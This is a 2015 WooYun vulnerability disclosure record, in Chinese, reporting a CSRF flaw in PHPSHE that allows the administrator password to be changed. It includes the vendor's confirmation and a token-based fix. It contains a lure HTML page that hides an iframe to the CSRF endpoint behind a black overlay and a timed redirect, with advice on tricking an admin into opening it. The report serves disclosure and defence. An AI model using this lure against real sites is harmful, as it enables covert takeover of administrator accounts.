{"id": 33722, "wybug_id": "wooyun-2015-0108173", "wybug_title": "PHPSHE csrf修改管理员密码", "wybug_corp": "phpshe.com", "wybug_author": "黑色键盘丶", "wybug_date": "2015-04-16 17:44", "wybug_open_date": "2015-07-17 11:10", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-17：\t细节向公众公开  简要描述： PHPSHE csrf修改管理员密码 详细说明：  1、一看修改管理员密码不要原密码验证抓包查看\n\n\n\n没有toekn值验证2、构造表单进行修改\n\n成修改\n\n不过这样发给管理一看就知道被修改了3、 我们新建一个html，代码如下\n<html><table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv=\"refresh\" content=\"4;url=http://www.baidu.com/\"> <!--设置一个正常的跳转页面！--><title>test</title><iframe src=\"http://localhost/csrf.php\"></iframe><!--csrf攻击页面的地址！--></html>\n4、这样我们只要访问这个test页面之后就可以修改其密码，而且这个页面会自动跳转到你想跳转的地方（当然，这个页面你可以适度美化，掩饰）\n\n\n\n也没提示啥的 诱惑管理员打开就ok5.不知道不觉管理员密码就被修改了\n\nok   漏洞证明：  1、一看修改管理员密码不要原密码验证抓包查看\n\n\n\n没有toekn值验证2、构造表单进行修改\n\n成修改\n\n不过这样发给管理一看就知道被修改了3、 我们新建一个html，代码如下\n<html><table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equiv=\"refresh\" content=\"4;url=http://www.baidu.com/\"> <!--设置一个正常的跳转页面！--><title>test</title><iframe src=\"http://localhost/csrf.php\"></iframe><!--csrf攻击页面的地址！--></html>\n4、这样我们只要访问这个test页面之后就可以修改其密码，而且这个页面会自动跳转到你想跳转的地方（当然，这个页面你可以适度美化，掩饰）\n\n\n\n也没提示啥的 诱惑管理员打开就ok5.不知道不觉管理员密码就被修改了\n\nok   修复方案：  token 值验证还有修改要原密码验证   版权声明：转载请注明来源 黑色键盘丶@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-18 11:09 厂商回复： 感谢@黑色键盘丶 提供代码审计，已将漏洞提交到技术部 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}